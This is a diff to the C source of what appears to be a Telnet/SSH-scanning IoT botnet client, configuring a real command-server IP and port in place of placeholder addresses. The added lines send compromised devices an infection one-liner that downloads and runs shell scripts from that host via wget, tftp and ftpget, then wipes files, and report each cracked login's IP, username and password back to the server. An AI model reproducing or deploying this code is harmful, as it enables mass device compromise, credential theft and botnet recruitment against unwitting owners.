@@ -57,10 +57,10 @@ Made Date: 7-26-16
 
 
 
-char *infectline = "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
+char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n";
 unsigned char *commServer[] =
 {
-        "0.0.0.0:666"
+        "34.83.175.106:6203"
 };
 
 char *useragents[] = {
@@ -1197,7 +1197,7 @@ void TelnetScanner()
 
                         case 9:
                                 {
-                                    if(send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                    if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
 									sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                     fds[i].state = 10;
                                 }
@@ -1223,7 +1223,7 @@ void TelnetScanner()
                                     {
 										fds[i].totalTimeout = 0;
 										fds[i].bufUsed = 0;
-										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
 										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
 										continue;
 
@@ -1232,7 +1232,7 @@ void TelnetScanner()
                                     {
 										fds[i].totalTimeout = 0;
 										fds[i].bufUsed = 0;
-										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
 										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
 										continue;
 
@@ -1241,7 +1241,7 @@ void TelnetScanner()
 									{
 										fds[i].totalTimeout = 0;
 										fds[i].bufUsed = 0;
-										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
 										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
 										memset(fds[i].sockbuf, 0, 1024);
 										sclose(fds[i].fd);
@@ -1607,7 +1607,7 @@ void SSHScanner()
 
                         case 9:
                                 {
-                                    if(send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                    if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
 									sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                     fds[i].state = 10;
                                 }
@@ -1621,7 +1621,7 @@ void SSHScanner()
                                     {
 										fds[i].totalTimeout = 0;
 										fds[i].bufUsed = 0;
-										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
 										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
 										continue;
 
@@ -1630,7 +1630,7 @@ void SSHScanner()
                                     {
 										fds[i].totalTimeout = 0;
 										fds[i].bufUsed = 0;
-										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
 										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
 										continue;
 
@@ -1639,7 +1639,7 @@ void SSHScanner()
 									{
 										fds[i].totalTimeout = 0;
 										fds[i].bufUsed = 0;
-										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.83.175.106/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 34.83.175.106 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 34.83.175.106; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.83.175.106 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
 										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
 										memset(fds[i].sockbuf, 0, 1024);
 										sclose(fds[i].fd);
